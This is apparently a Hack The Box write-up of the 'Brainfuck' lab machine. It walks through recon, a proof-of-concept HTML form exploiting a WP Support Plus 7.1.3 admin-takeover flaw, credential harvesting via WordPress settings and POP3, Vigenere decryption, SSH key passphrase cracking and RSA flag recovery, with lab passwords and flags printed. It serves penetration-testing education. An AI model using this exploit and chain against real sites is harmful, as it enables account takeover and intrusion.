---
layout: single
title: Brainfuck - Hack The Box
excerpt: "Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."
date: 2021-02-16
classes: wide
header:
  teaser: /assets/images/htb-writeup-brainfuck/brainfuck_logo.png
  teaser_home_page: true
  icon: /assets/images/htb.png
categories:
  - hackthebox
  - infosec
tags:  
  - osticket
  - mysql
  - mattermost
  - hashcat
  - rules
---

![](/assets/images/htb-writeup-brainfuck/brainfuck_logo.png)

"Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."

----------------


   ██╗   ██╗███████╗███████╗██████╗
   ██║   ██║██╔════╝██╔════╝██╔══██╗
   ██║   ██║███████╗█████╗  ██████╔╝
   ██║   ██║╚════██║██╔══╝  ██╔══██╗
   ╚██████╔╝███████║███████╗██║  ██║
    ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝

1. [root:/git/htb/brainfuck]# nmap -Pn -n -sCV 10.10.10.17                                                                           (master✱)
    PORT    STATE SERVICE  VERSION
    22/tcp  open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey:
    |   2048 94:d0:b3:34:e9:a5:37:c5:ac:b9:80:df:2a:54:a5:f0 (RSA)
    |   256 6b:d5:dc:15:3a:66:7a:f4:19:91:5d:73:85:b2:4c:b2 (ECDSA)
    |_  256 23:f5:a3:33:33:9d:76:d5:f2:ea:69:71:e3:4e:8e:02 (ED25519)
    25/tcp  open  smtp     Postfix smtpd
    |_smtp-commands: brainfuck, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN,
    110/tcp open  pop3     Dovecot pop3d
    |_pop3-capabilities: USER RESP-CODES SASL(PLAIN) AUTH-RESP-CODE CAPA TOP PIPELINING UIDL
    143/tcp open  imap     Dovecot imapd
    |_imap-capabilities: capabilities ENABLE IDLE have AUTH=PLAINA0001 more Pre-login LOGIN-REFERRALS post-login IMAP4rev1 OK SASL-IR listed LITERAL+ ID
    443/tcp open  ssl/http nginx 1.10.0 (Ubuntu)
    |_http-server-header: nginx/1.10.0 (Ubuntu)
    |_http-title: Welcome to nginx!
    | ssl-cert: Subject: commonName=brainfuck.htb/organizationName=Brainfuck Ltd./stateOrProvinceName=Attica/countryName=GR
    | Subject Alternative Name: DNS:www.brainfuck.htb, DNS:sup3rs3cr3t.brainfuck.htb
    | Not valid before: 2017-04-13T11:19:29
    |_Not valid after:  2027-04-11T11:19:29
    |_ssl-date: TLS randomness does not represent time
    | tls-alpn:
    |_  http/1.1
    | tls-nextprotoneg:
    |_  http/1.1
    Service Info: Host:  brainfuck; OS: Linux; CPE: cpe:/o:linux:linux_kernel

  DIRB:
    -

  NIKTO:
    -


2. Add the the names 'www.brainfuck.htb' and 'sup3rs3cr3t.brainfuck.htb' to /etc/hosts, found from the nmap output.

    'sup3rs3cr3t.brainfuck.htb' is a git-like page. Looking around we find the users 'orestis' and 'admin'.
    We can create an account but not much more then that.

    'www.brainfuck.htb' is the main wordpress page. Visiting 'https://brainfuck.htb/wp-login.php' we find in the source code that it's version 4.7.3.

    Run WPscan towards the site to see if we find any vulnerable plugins.

    [root:/git/htb/brainfuck]# wpscan --url https://brainfuck.htb/ --enumerate p --disable-tls-checks
      [+] wp-support-plus-responsive-ticket-system
       | Location: https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/
       | Last Updated: 2019-09-03T07:57:00.000Z
       | [!] The version is out of date, the latest version is 9.1.2
       |
       | Found By: Urls In Homepage (Passive Detection)
       |
       | Version: 7.1.3 (100% confidence)
       | Found By: Readme - Stable Tag (Aggressive Detection)
       |  - https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/readme.txt
       | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
       |  - https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/readme.txt


3. Reading about wp-support-plus-responsive-ticket-system 7.1.3 we find a vulnerability where we can steal admin cookies to gain unauth access.

    Download the POC-code and modify it to our needs.
    [root:/git/htb/brainfuck]# cat test.html                                                                                          (master✱)
      <html>
      <body>
      	<h1> PlayerThree POC - wp_set_auth_cookie PrivEsc</h1>
      	<p>1. Enter username of whom to steal cookie from. Press 'STEAL!'.</p>
      	<p>2. Visit https://brainfuck.htb/wp-admin/ to gain the users admin access.</p>
      <form method="post" action="https://brainfuck.htb/wp-admin/admin-ajax.php">
      	Username: <input type="text" name="username" value="admin">
      	<input type="hidden" name="email" value="sth">
      	<input type="hidden" name="action" value="loginGuestFacebook">
      	<input type="submit" value="STEAL!">
      </form>
      </body>
      </html>

    Open the file, press 'STEAL!' and then visit https://brainfuck.htb/wp-admin/ to reach the admin dashboard.


4. In the wp-admin dashboard browse to Settings > Easy WP SMTP. Inspect element and you'll see the hidden password.

    <input type="password" name="swpsmtp_smtp_password" value="kHGuERB29DNiNE">

    SMTP Creds: orestis:kHGuERB29DNiNE

    As we could see from initial recon pop3 (110) and imap (143) are open on the remote host. Either setup a mail-client, like Thunderbird,
    or access the server through telnet. I chose to start with telnet as it's faster, if we don't find anything of use I'd go to Thunderbird.

    root@nidus:/git/htb/brainfuck# telnet 10.10.10.17 110
    Trying 10.10.10.17...
    Connected to 10.10.10.17.
    Escape character is '^]'.
    +OK Dovecot ready.
    USER orestis
        +OK
    PASS kHGuERB29DNiNE
      +OK Logged in.

    RETR 2
      +OK 514 octets
      Return-Path: <root@brainfuck.htb>
      X-Original-To: orestis
      Delivered-To: orestis@brainfuck.htb
      Received: by brainfuck (Postfix, from userid 0)
      	id 4227420AEB; Sat, 29 Apr 2017 13:12:06 +0300 (EEST)
      To: orestis@brainfuck.htb
      Subject: Forum Access Details
      Message-Id: <20170429101206.4227420AEB@brainfuck>
      Date: Sat, 29 Apr 2017 13:12:06 +0300 (EEST)
      From: root@brainfuck.htb (root)

      Hi there, your credentials for our "secret" forum are below :)

      username: orestis
      password: kIEnnfEKJ#9UmdO

      Regards
      .


5. We found an email with credentials orestis:kIEnnfEKJ#9UmdO to the "secret" forum.
    Browse to sup3rs3cr3t.brainfuck.htb and login as orestis.

    Here we find a message from the admin saying that all SSH passwords are revoked, and the users should use keys instead.
    orestis and admin have an enctrypted conversation, we instantly spot a url and try to decode the message.

      mnvze://10.10.10.17/8zb5ra10m915218697q1h658wfoq0zc8/frmfycu/sp_ptr

    'mnvze' is most likely https, and 'sp_ptr' could be id_rsa since they are talking about ssh keys.

    Looking at unencrypted posts in thread SSH Access orestis always ends his posts with 'Orestis - Hacking for fun and profit',
    this gives us a huge hint as all encrypted messages have a similar ending.

    Pieagnm - Jkoijeg nbw zwx mle grwsnn
    Wejmvse - Fbtkqal zqb rso rnl cwihsf
    Qbqquzs - Pnhekxs dpi fca fhf zdmgzt

    Testing around different common ciphers I found that Vigenere Cipher gave me an interesting output.
    Passphrase: https
    Message: mnvze
    Decoded message: fuckm

    Testing if sp_ptr is id_rsa.
    Passphrase: id_rsa
    Message: sp_ptr
    Decoded message: km_ybr

    Lets try the signatures as well:
    Passphrase: orestis
    Message1: Pieagnm
    Decode1: Brainfu

    Message2: Wejmvse
    Decode2: Infuckm

    Message3: Qbqquzs
    Decode3: Ckmybra

    Adding all the decoded messages together it looks like the key should be 'fuckmybrain'

    Decrypting the conversation between Orestis and Admin:

    ADMIN:
      There you go you stupid fuck, I hope you remember your key password because I dont :)
      https://10.10.10.17/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa

    ORESTIS:
      No problem, I'll brute force it ;)


6. Download the id_rsa and brute force it.

    Convert id_rsa (.pem) to hash with ssh2john, and the crack with john.
      [root:/git/htb/brainfuck]# /usr/share/john/ssh2john.py id_rsa > id_rsa.hash
      [root:/git/htb/brainfuck]# john id_rsa.hash -wordlist=/usr/share/wordlists/rockyou.txt
      [..]
      3poulakia!       (id_rsa)

    [root:/git/htb/brainfuck]# chmod 600 id_rsa
    [root:/git/htb/brainfuck]# ssh orestis@10.10.10.17 -i id_rsa                                                                      (master✱)
      Enter passphrase for key 'id_rsa':3poulakia!
      [..]
      orestis@brainfuck:~$ cat user.txt
        2c11cfbc5b959f73ac15a3310bd097c9



██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██████╗  ██████╗  ██████╗ ████████╗
   ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝
   ██████╔╝██║   ██║██║   ██║   ██║
   ██╔══██╗██║   ██║██║   ██║   ██║
   ██║  ██║╚██████╔╝╚██████╔╝   ██║
   ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝


1. In orestis home directory we find three files pointing us towards root.txt.

    - encrypt.sage
    - output.txt
    - debug.txt

  ENCRYPT  BREAKDOWN;
    PASSWORD:
      - sets content of /root/root.txt as variable 'password'
      - encodes 'password' to hex16, and declare it variable 'm', as an integer
      - c = pow(m, e, n), meaning (m**e) % n = c
      - Encrypted password = c

    To get the unencrypted password I need to figure out the variables m, e and n to be able to reverse it.

    e = last string of debug.txt
    n = first (p) * second (q) string of debug.txt
    m = calculate the equation (m**e) % n = output.txt


2. The code to grab /root/root.txt is commented making it possible to understand what happens.
[root:/git/htb/brainfuck]# python3 root-plz.py                                                                                    (master✱)
  Formel to calculate: (x^b) mod c = y
  ---snip---
  x decoded (/root/root.txt): 6efc1a5dbb8904751ce6566a305bb8ef

Report flag and win.

██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██╗███╗   ██╗███████╗ ██████╗ ██████╗ ███╗   ███╗ █████╗ ████████╗██╗ ██████╗ ███╗   ██╗
   ██║████╗  ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║
   ██║██╔██╗ ██║█████╗  ██║   ██║██████╔╝██╔████╔██║███████║   ██║   ██║██║   ██║██╔██╗ ██║
   ██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║╚██╔╝██║██╔══██║   ██║   ██║██║   ██║██║╚██╗██║
   ██║██║ ╚████║██║     ╚██████╔╝██║  ██║██║ ╚═╝ ██║██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║
   ╚═╝╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝

WordPress Plugin WP Support Plus Responsive Ticket System 7.1.3 - Privilege Escalation POC
  https://www.exploit-db.com/exploits/41006

POP3 Using Telnet:
  https://kewl.lu/articles/pop3/

Vigenere Cipher decrypt:
  http://rumkin.com/tools/cipher/vigenere.php

Charmichael lambda:
  https://stackoverflow.com/questions/49818392/how-to-find-reverse-of-powa-b-c-in-python

Decode integer:
  https://stackoverflow.com/questions/40123901/python-integer-to-hex-string-with-padding/40123984#40123984
